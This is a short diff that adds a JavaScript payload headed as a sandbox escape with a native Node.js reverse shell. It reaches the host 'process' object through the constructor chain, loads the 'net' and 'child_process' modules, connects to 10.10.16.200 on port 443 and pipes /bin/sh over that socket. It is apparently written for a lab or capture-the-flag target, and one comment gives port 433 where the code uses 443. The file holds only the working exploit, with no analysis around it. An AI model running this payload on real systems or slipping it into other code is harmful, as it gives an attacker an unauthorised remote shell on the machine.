@@ -1,0 +1,19 @@
+#Sandbox Escape + Native Node.js Reverse Shell (Bypassing the Absence of Bash)
+({x: (function(){
+    try {
+        // Attempt to escape by retrieving the global `process` object from the constructor
+        const process = this.constructor.constructor('return process')();
+        const net = process.mainModule.require('net');
+        const cp = process.mainModule.require('child_process');
+        
+        const client = new net.Socket();
+        // Connect to port 433
+        client.connect(443, '10.10.16.200', function(){
+            const sh = cp.spawn('/bin/sh', []);
+            client.pipe(sh.stdin);
+            sh.stdout.pipe(client);
+            sh.stderr.pipe(client);
+        });
+    } catch(e) {}
+    return [];
+})()})
